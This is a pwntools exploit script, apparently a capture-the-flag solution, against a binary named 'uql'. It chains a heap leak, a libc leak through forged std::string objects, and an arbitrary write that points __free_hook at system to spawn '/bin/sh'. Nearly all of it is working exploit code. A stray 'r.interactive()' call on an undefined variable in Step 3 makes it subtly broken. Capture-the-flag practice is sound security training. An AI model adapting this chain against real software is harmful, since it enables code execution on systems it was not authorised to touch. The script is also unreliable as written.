#!/usr/bin/python3

from pwn import *

def insert(data):
    return f' insert {data}'
def remove(data):
    return f' remove {data}'
def modify(data, index, char):
    return f' modify {data} to be {char} at {index}'
def display():
    return " display everything"
def execute(code):
    sock.sendlineafter("> ", code)
libc = ELF("./libc-2.31.so")
sock = process('./uql')
#sock = Socket("nc shell.actf.co 21321")
"""
Step 1. heap leak
"""
code = ''
code += insert('A' * 0x10)
code += insert('B' * 0x10)
code += insert('C' * 0x10)
code += remove('C' * 0x10)
execute(code)
code = remove('B' * 0x10)
execute(code)
code = display()
code += remove('A' * 0x10)
execute(code)
addr_heap = u64(sock.recvline()[:8])
info("heap = " + hex(addr_heap))
"""
Step 2. libc leak
"""
payload  = b'A' * 0xc0
payload += p64(addr_heap + 0x20) # fake std::string
payload += p64(0x8)
payload += p64(0x8)
payload += p64(0)
payload += b'A' * (0x100 - len(payload))
execute(payload)
code = ''
for i in range(6):
    code += insert(chr(0x41 + i) * 8)
execute(code)
payload = b'X' * 0x420
execute(payload)
code = display()
code += remove(chr(0x46) * 8)
execute(code)
for i in range(5):
    sock.recvline()
libc_base = u64(sock.recvline()[:-1].ljust(8, b'\x00')) - 0x1ebb80 - 0x70
info("libc = " + hex(libc_base))
"""
Step 3. AAW to win
"""
payload  = b'B' * 0x1a0
payload += p64(libc_base + libc.sym['__free_hook']) # fake std::string
payload += p64(8)
payload += p64(8)
payload += p64(0)
payload += b'B' * (0x200 - len(payload))
execute(payload)
code = ''
r.interactive()
for i in range(8):
    code += insert(chr(0x61 + i) * 8)
code += remove(chr(0x68) * 8)
target = libc_base + libc.sym['system']
for i in range(6):
    code += modify('\x00' * 8, i, chr((target >> (i*8)) & 0xff))
execute(code)
"""
Step 4. Execute command
"""
execute("/bin/sh" + "\0"*0x10)
sock.interactive()
